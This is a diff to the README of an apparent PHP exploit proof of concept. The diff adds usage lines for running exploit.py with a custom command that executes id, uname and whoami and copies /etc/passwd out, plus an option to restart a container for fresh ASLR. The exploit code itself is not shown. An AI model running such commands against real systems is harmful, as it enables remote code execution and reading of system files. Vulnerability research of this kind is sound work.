@@ -22,6 +22,15 @@ Usage for phppoc2
 
 ```
 python3 exploit.py --port 18110
+
+#Run a custom command:
+# Write a script to the mounted out/ dir
+printf 'id; uname -a; whoami; cat /etc/passwd > /out/p1\n' > out/c
+python3 exploit.py --port 18110 --cmd 'sh</out/c'
+cat out/p1
+
+#Re-run with fresh ASLR (new container):
+python3 exploit.py --port 18110 --restart p2s-pure-18110
 ```
 
 Writeup coming soon. Credit to Syrex1013
